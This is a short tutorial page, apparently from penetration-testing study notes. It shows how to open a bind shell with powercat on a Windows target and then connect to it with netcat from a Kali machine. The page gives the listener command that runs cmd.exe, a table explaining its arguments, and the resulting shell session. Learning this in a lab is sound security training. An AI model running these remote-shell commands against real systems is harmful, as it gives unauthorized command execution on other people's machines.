---
description: Creating bind shells with powercat
---

# Powercat

## Basic Bind Shell

The usage of a bind shell with powercat is similar to the other tools listed.

### Target Machine

First a listener must be started with powercat on the target machine:

```powerquery
PS C:\Users\offsec> powercat -l -p 443 -e cmd.exe
```

| Argument    | Description                                           |
| ----------- | ----------------------------------------------------- |
| `-l`        | Tells powercat to **listen** for a connection         |
| `-p {PORT}` | Specifies the listening **port**                      |
| `-e {APP}`  | Application that will be **executed** upon connection |

### Attacker Machine

Application of the attacker's choice can be used for connection (in this example netcat is used).

```bash
kali@kali:~$ nc 10.11.0.22 443
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\offsec>
```
